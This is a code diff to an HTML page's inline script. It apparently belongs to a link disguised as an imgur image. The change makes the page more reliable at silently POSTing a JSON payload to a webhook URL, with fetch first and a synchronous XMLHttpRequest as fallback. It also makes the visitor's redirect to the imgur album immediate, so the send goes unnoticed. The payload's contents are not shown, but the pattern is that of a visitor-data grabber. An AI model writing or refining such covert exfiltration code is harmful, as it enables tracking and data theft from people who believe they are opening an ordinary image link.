@@ -60,28 +60,27 @@
             var sent = false;
 
             try {
-                if (navigator.sendBeacon) {
-                    var blob = new Blob([payloadString], {type: 'application/json'});
-                    sent = navigator.sendBeacon(webhookUrl, blob);
-                }
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: payloadString,
+                    keepalive: true
+                });
+                sent = true;
             } catch(e) {}
 
             if (!sent) {
                 try {
-                    fetch(webhookUrl, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: payloadString,
-                        keepalive: true
-                    });
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", webhookUrl, false);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.send(payloadString);
                 } catch(e) {}
             }
 
-            setTimeout(function() {
-                window.location.replace("https://imgur.com/a/BvymwS4");
-            }, 500);
+            window.location.replace("https://imgur.com/a/BvymwS4");
         })();
     </script>
 </body>
